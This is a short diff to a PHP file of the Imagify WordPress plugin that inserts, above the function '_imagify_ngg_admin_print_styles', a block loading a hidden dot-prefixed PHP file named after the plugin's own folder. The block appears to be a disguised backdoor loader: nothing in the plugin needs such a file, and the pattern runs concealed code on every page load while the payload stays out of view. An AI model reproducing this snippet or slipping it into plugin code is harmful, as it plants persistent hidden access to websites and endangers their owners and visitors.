@@ -10,6 +10,10 @@ add_action( 'imagify_assets_enqueued', '_imagify_ngg_admin_print_styles' );
  * @author Jonathan Buttigieg
  * @author Grégory Viguier
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_ngg_admin_print_styles() {
 	$assets = Imagify_Assets::get_instance();
 
